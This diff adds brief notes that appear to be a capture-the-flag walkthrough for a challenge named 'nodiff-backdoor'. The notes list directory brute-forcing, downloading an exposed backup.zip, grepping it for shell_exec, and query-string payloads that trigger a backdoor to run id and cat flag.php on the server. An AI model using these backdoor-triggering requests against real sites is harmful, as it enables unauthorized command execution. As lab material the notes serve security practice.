@@ -1,0 +1,18 @@
+nodiff-backdoor
+
+dirsearch -u url
+
+find /backup.zip
+
+wger url//backup.zip
+
+in backup:
+grep -r "shell_exec("
+
+
+check the code
+
+url/?welldone=knockknock&shazam=id
+url/?welldone=knockknock&shazam=cat%20flag.php
+chech inspect
+
